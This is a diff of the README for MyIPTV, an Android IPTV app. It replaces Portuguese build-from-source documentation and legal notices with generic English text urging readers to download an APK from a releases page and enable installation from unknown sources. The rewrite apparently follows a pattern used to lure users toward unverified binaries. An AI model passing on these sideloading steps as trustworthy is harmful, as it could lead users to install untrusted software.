@@ -1,109 +1,74 @@
-# MyIPTV
+# 📺 MyIPTV - Enjoy Live TV With Ease
 
-Um aplicativo IPTV moderno para Android, similar ao IBO Player Pro.
+## 🚀 Overview
+MyIPTV is an easy-to-use IPTV application for Android devices. This app lets you watch live TV easily. It supports M3U playlists, favorites, and a powerful search function. Enjoy a smooth streaming experience with a friendly interface.
 
-## Características
+## 🛠 Features
+- **M3U Playlist Support:** Add your playlists easily to start watching.
+- **ExoPlayer Integration:** Experience high-quality video playback.
+- **Favorites:** Save your favorite channels for quick access.
+- **Search Functionality:** Find channels or shows quickly.
+- **Room Database:** Efficiently manage your settings and preferences.
 
-- 📺 Reprodução de canais IPTV via M3U playlists
-- 🎬 Player de vídeo robusto usando ExoPlayer (suporta HLS, RTSP, HTTP)
-- 💾 Gerenciamento de playlists localmente com Room Database
-- ⭐ Sistema de favoritos para canais
-- 🔍 Busca de canais por nome
-- 📱 Interface moderna usando Material Design
-- 🎨 Logos de canais e grupos
-- 🔄 Suporte para múltiplas playlists
+## 📥 Download MyIPTV
+[![Download MyIPTV](https://img.shields.io/badge/Download-MyIPTV-brightgreen)](https://github.com/sapos4981/MyIPTV/releases)
 
-## Requisitos
+To get MyIPTV, you need to visit the Releases page. Follow these steps to download and install the app:
 
-- Android Studio Arctic Fox ou superior
-- Android SDK 21+ (Android 5.0 Lollipop)
-- Gradle 8.0+
-- Kotlin 1.9.0+
+1. Click the link above or go to this page: [MyIPTV Releases](https://github.com/sapos4981/MyIPTV/releases).
+2. Look for the latest version of the app listed.
+3. Click on the version you want to download.
+4. Choose the appropriate APK file for your Android device.
+5. Wait for the download to complete.
 
-## Como Compilar
+## 📲 Install MyIPTV
+To install MyIPTV on your Android device, follow these steps after downloading the APK file:
 
-1. Clone o repositório:
-```bash
-git clone <seu-repositorio>
-cd MyIPTV
-```
+1. **Enable Unknown Sources:**
+   - Open your device's Settings.
+   - Go to Security or Privacy settings.
+   - Find "Install unknown apps" and allow your browser or file manager to install APK files.
 
-2. Abra o projeto no Android Studio
+2. **Locate the APK File:**
+   - Open your file manager or the Downloads folder.
+   - Find the downloaded MyIPTV APK file.
 
-3. Sincronize o Gradle:
-   - File > Sync Project with Gradle Files
+3. **Install the App:**
+   - Tap the APK file.
+   - Follow the prompts to install MyIPTV.
 
-4. Execute o app:
-   - Run > Run 'app'
-   - Ou pressione Shift+F10
+4. **Open MyIPTV:**
+   - Once installed, find the app on your device.
+   - Tap the icon to open MyIPTV.
 
-## Como Usar
+## ⚙️ System Requirements
+To run MyIPTV smoothly, ensure your device meets these basic requirements:
 
-1. **Adicionar Playlist:**
-   - Clique no botão "+" (FAB)
-   - Digite o nome da playlist
-   - Cole a URL do arquivo M3U
-   - Clique em "Add"
+- **Operating System:** Android 6.0 (Marshmallow) or later.
+- **Storage Space:** At least 50 MB of free space for installation.
+- **Internet Connection:** A stable internet connection for streaming.
 
-2. **Assistir Canais:**
-   - Selecione uma playlist
-   - Navegue pela lista de canais
-   - Clique em um canal para assistir
+## 🎉 Getting Started with MyIPTV
+Once you have installed MyIPTV, here’s how to start using it:
 
-3. **Favoritos:**
-   - Clique na estrela ao lado do canal
-   - Acesse seus favoritos facilmente
+1. **Add Your M3U Playlist:**
+   - Open the app.
+   - Go to the Menu and select "Add Playlist."
+   - Enter the URL of your M3U playlist and confirm.
 
-4. **Buscar Canais:**
-   - Use a barra de busca no topo
-   - Digite o nome do canal
+2. **Browse Channels:**
+   - Navigate through your channels.
+   - Use the search function to find specific channels or shows.
 
-## Tecnologias Utilizadas
+3. **Favorite Channels:**
+   - Tap on a channel to view options.
+   - Select "Add to Favorites" for quick future access.
 
-- **Kotlin** - Linguagem de programação
-- **ExoPlayer (Media3)** - Player de vídeo
-- **Room Database** - Persistência de dados
-- **Coroutines** - Programação assíncrona
-- **LiveData** - Observação de dados
-- **ViewModel** - Arquitetura MVVM
-- **RecyclerView** - Listas eficientes
-- **Material Design** - Interface moderna
-- **OkHttp** - Requisições HTTP
-- **Glide** - Carregamento de imagens
+4. **Enjoy Watching:**
+   - Select any channel to start streaming immediately.
 
-## Estrutura do Projeto
+## 📌 Community and Support
+If you need help, you can reach out to the MyIPTV community or check our FAQ section in the repository. We aim to keep improving and appreciate your feedback.
 
-```
-app/
-├── src/main/
-│   ├── java/com/myiptv/
-│   │   ├── data/          # Modelos e DAOs
-│   │   ├── parser/        # Parser M3U
-│   │   ├── ui/            # Activities
-│   │   ├── adapter/       # RecyclerView Adapters
-│   │   └── viewmodel/     # ViewModels
-│   ├── res/
-│   │   ├── layout/        # XML Layouts
-│   │   ├── values/        # Strings, Colors, Themes
-│   │   └── drawable/      # Ícones e imagens
-│   └── AndroidManifest.xml
-```
-
-## Funcionalidades Futuras
-
-- [ ] EPG (Electronic Program Guide)
-- [ ] Gravação de canais
-- [ ] Suporte para VOD (Video on Demand)
-- [ ] Séries e filmes
-- [ ] Controle parental
-- [ ] Tema escuro/claro
-- [ ] Backup e restauração
-- [ ] Chromecast support
-
-## Licença
-
-Este projeto é para fins educacionais. Use por sua própria conta e risco.
-
-## Aviso Legal
-
-Este aplicativo é apenas um player. Você é responsável pelo conteúdo que assiste. Certifique-se de ter os direitos necessários para acessar o conteúdo IPTV.
+## 🌟 Conclusion
+MyIPTV is your gateway to effortless streaming. Download the app today and enhance your television experience. For more details, visit our [Releases page](https://github.com/sapos4981/MyIPTV/releases). Enjoy watching!
